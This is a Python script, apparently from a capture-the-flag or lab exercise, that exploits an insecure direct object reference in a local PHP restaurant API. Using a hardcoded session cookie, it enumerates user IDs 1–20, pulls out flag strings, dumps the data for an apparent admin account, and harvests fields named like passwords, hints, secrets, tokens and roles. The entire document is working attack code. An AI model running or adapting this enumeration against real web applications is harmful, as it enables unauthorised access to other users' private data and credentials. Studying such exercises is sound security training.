import requests
import json
import re

BASE_URL = "http://127.0.0.1:33156"
API_ENDPOINT = "/api/get_favorite_restaurants.php"

def extract_flags(text):
    """Extract FLAG{...} patterns from text"""
    return re.findall(r'FLAG\{[^}]+\}', text)

def find_sensitive_fields(data_dict, user_id):
    """Find sensitive keyword fields"""
    keywords = ['password','hint','secret','token','admin','role','privilege']
    findings = []
    
    for key, value in data_dict.items():
        for kw in keywords:
            if kw in key.lower():
                findings.append({'user_id': user_id, 'field': key, 'value': value})
    return findings

# Setup session
cookie = {"PHPSESSID": "j2jbue9ik42nla625rupl7v2jk"}
session = requests.Session()
session.cookies.update(cookie)

# Collection containers
found_flags = []
admin_user_data = None
sensitive_fields = []
response_summary = []

# Enumerate user IDs 1-20
for user_id in range(1, 21):
    url = f"{BASE_URL}{API_ENDPOINT}?userId={user_id}"
    
    try:
        resp = session.get(url, timeout=15)
        response_text = resp.text
        response_length = len(response_text)
        
        # Try to parse as JSON
        try:
            json_data = json.loads(response_text)
            is_json = True
            
            # Check for admin user
            if user_id == 7:
                admin_user_data = json_data
        
        except:
            is_json = False
            json_data = None
        
        # Search for flags
        flags = extract_flags(response_text)
        if flags:
            found_flags.extend([{'user_id': user_id, 'flag': f} for f in flags])
        
        # Search for sensitive fields
        if is_json and isinstance(json_data, dict):
            sensitive = find_sensitive_fields(json_data, user_id)
            if sensitive:
                sensitive_fields.extend(sensitive)
        
        # Store summary
        response_summary.append({
            'user_id': user_id,
            'status': resp.status_code,
            'length': response_length,
            'has_flags': len(flags) > 0,
            'has_sensitive': len(sensitive) > 0 if is_json else False
        })
        
    except Exception as e:
        response_summary.append({'user_id': user_id, 'error': str(e)})

# Print results
print("[API ENUMERATION COMPLETE]")
print("=" * 50)

# Flags
print(f"\nFLAGS FOUND: {len(found_flags)}")
if found_flags:
    for item in found_flags:
        print(f"User {item['user_id']}: {item['flag']}")
else:
    print("No flags detected")

# Admin data
print(f"\nADMIN DATA (userId=7):")
if admin_user_data:
    print(json.dumps(admin_user_data, indent=2))
else:
    print("No admin data found")

# Sensitive fields
print(f"\nSENSITIVE FIELDS: {len(sensitive_fields)}")
if sensitive_fields:
    for item in sensitive_fields:
        print(f"User {item['user_id']}: {item['field']}={item['value']}")
else:
    print("No sensitive fields found")

# Summary
print(f"\nRESPONSE SUMMARY:")
success = sum(1 for r in response_summary if 'error' not in r)
print(f"Successful: {success}/20")

print(f"\nBy userId (id|status|flags|sensitive):")
for item in response_summary:
    if 'error' in item:
        print(f"{item['user_id']:2d}: ERROR - {item['error']}")
    else:
        flags_mark = "✓" if item['has_flags'] else "-"
        sens_mark = "✓" if item['has_sensitive'] else "-"
        print(f"{item['user_id']:2d}: {item['status']} | {item['length']}B | {flags_mark}flags | {sens_mark}sensitive")

print(f"\nTotal flags captured: {len(found_flags)}")
